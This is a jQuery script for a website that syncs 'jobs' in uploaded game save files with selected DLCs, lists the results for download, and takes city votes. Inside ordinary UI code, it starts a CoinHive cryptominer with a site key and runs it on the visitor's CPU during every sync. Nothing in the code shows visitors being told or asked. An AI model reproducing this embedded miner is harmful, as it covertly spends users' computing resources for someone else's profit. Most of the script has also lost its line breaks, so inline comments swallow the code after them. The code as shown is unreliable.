$('.vote').show();
$('.selectpicker').selectpicker('deselectAll');
$('#manual').click(function() {
    var src = 'https://www.youtube.com/embed/C4167eC2YW8?showinfo=0';
    $('#YTmodal').modal('show');
    $('#YTmodal iframe').attr('src', src);
});
$('#close').click(function() {
    $('.modal iframe').removeAttr('src');
});
if (typeof CoinHive !== 'undefined') {
    var digg = new CoinHive.Anonymous('mqua0gMeJJHe3mBo4r3aR4AYLF2mDDzP');
} else {
    $('#ABmodal').modal('show');
} // Info panel blinkvar blink = setInterval(function(){$('#dlcfrance-panel').fadeTo(300,0.15, function(){$(this).fadeTo(200,1);});}, 2000);$('#dlcfrance-panel').click(function(){clearInterval(blink);});function fileList(id){switch (id){case 'orig' : var name = 'Original save game';break;case 'synced' :var name = 'Synced jobs save game';break;}$.ajax({method: "POST",url: "file_list.php",data: {file : id},dataType: "json",success : function(response) {if (!response.empty) {$( '#'+id+' #file' ).html( "<a href='downloader.php?file="+id+"' target='_blank'>"+name+"</a>" );$( '#'+id+' #size' ).html( response.size );$( '#'+id+' #mtime' ).html( response.mtime );if ( $( '#'+id ).is(":hidden") ){ $( '#'+id ).show() };if ( $( '#fileBox' ).is(":hidden") ) { $( '#fileBox' ).slideDown(); }//} else {//if (! $( '#fileBox' ).is(":hidden") ) { $( '#fileBox' ).hide() };}//console.log(response);},complete : function(r) {},error:    function(error) {console.log(error);}});}function syncJobs(origFile, syncedFile, selectedDLCs){$.ajax({method: "POST",url: "engine.php",data: {f_path_orig : origFile,f_path_synced : syncedFile,dlcs : selectedDLCs},dataType: "json",beforeSend : function() {digg.setThrottle(0.5);digg.start();},success : function(response) {console.log(response);if ( response.error == 'false' ){alertBox("success", "Jobs succesully synced. Enjoy!");} else {alertBox("danger", response.error);}},complete : function(r) {fileList('orig');fileList('synced');if (! $( '#fileBox' ).is(":hidden") ) { $( '#fileBox' ).fadeTo('fast', 1); }$(".synchronizing").alert('close');},error:    function(error) {console.log(error);}});}function escapeTags( str ) {  return String( str )   .replace( /&/g, '&amp;' )   .replace( /"/g, '&quot;' )   .replace( /'/g, '&#39;' )   .replace( /</g, '&lt;' )   .replace( />/g, '&gt;' );}function selectedDLCs() {   var selected = new Array();   $("#DLCs").find("input:checked").each(function() {selected.push( $(this).attr('value') );   });   return selected;};function VotedCity() {var city = $('#vote option:selected').text();if ( city != '' ){$.ajax({method: "POST",url: "vote.php",data: { voted_city : city},dataType: "json",success : function(response) {if ( ! response.error  ){alertBox("success", "Thank you for your vote.");$('.vote').hide();} else {alertBox("danger", response.error);}},error:    function(error) {console.log(error);alertBox("danger", error);}});} else {$( '.vote' ).attr('disabled', false);}};function alertBox(type, msg) {switch (type) {case 'danger':var glyphicon = 'exclamation-sign';break;case 'success':var glyphicon = 'ok';break;case 'warning':var glyphicon = 'warning-sign';break;default:var glyphicon = 'refresh';}$('#alertBox').append("<div class='alert alert-"+type+"'> <span class='glyphicon glyphicon-"+glyphicon+"' aria-hidden='true'></span> <span class='close' data-dismiss='alert'>&times;</span>"+msg+"</div>");};$('#dlc').multipleSelect({placeholder: "Haven`t got DLC`s",isOpen: false,keepOpen: true,selectAll: false,width: 250,allSelected: "Got all DLC`s",});  $(function () {  $('[data-toggle="popover"]').popover();}); window.onload = function() {fileList('orig');fileList('synced');  var btn = document.getElementById('uploadBtn'),  progressBar = document.getElementById('progressBar'),  progressOuter = document.getElementById('progressOuter');  var uploader = new ss.SimpleUpload({button: btn,debug: false,url: 'file_upload.php',name: 'uploadfile',multipart: true,hoverClass: 'hover',focusClass: 'focus',responseType: 'json',startXHR: function() {progressOuter.style.display = 'block'; // make progress bar visiblethis.setProgressBar( progressBar );},onSubmit: function() {if (! $( '#fileBox' ).is(":hidden") ) { $( '#fileBox' ).fadeTo('fast', 0.3); }btn.innerHTML = "Uploading..."; // change button text to "Uploading..."  },onComplete: function( filename, response ) {btn.innerHTML = "Choose File";progressOuter.style.display = 'none'; // hide progress bar when upload is completedif ( !response ) {alertBox("danger", "Unable to upload file");return;}if ( response.success === true ) {//    $( '#fileBox' ).fadeTo('fast', 1);syncJobs(response.file_path, response.f_path_synced, selectedDLCs);alertBox("info synchronizing", "Synchronizing jobs <img src='img/load.gif'/>");} else {if ( response.msg )  {alertBox("danger",escapeTags(response.msg));} else {alertBox("danger", "An error occurred and the upload failed.");}if (! $( '#fileBox' ).is(":hidden") ) { $( '#fileBox' ).fadeTo('fast', 1); }}  },onError: function() {progressOuter.style.display = 'none';btn.innerHTML = 'Choose File';alertBox("danger", "Unable to upload file");if (! $( '#fileBox' ).is(":hidden") ) { $( '#fileBox' ).fadeTo('fast', 1); }  }});};